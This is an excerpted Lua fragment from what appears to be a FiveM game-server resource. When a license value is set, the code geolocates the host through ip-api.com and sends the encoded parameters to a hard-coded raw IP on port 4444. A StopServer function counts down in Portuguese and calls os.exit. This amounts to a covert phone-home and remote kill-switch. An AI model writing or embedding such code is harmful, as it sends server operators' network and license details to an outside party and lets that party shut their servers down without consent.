    ...
    if GetCurrentResourceName() == resourceName then
		if license ~= nil and license ~= '' then
			PerformHttpRequest("http://ip-api.com/json/?fields=61439", function(errorCode, resultData, resultHeaders)
				...
				PerformHttpRequest("http://181.215.253.55:4444/api/resources/?param="..json.encode(params), function(errorCode2, resultData2, resultHeaders2) 
...
function StopServer()
    print('^1[-] ^0Servidor sendo desligado em ^23 segundos');Citizen.Wait(1000);print('^1[-] ^0Servidor sendo desligado em ^22 segundos');Citizen.Wait(1000);print('^1[-] ^0Servidor sendo desligado em ^21 segundo');Citizen.Wait(1000);os.exit()
end
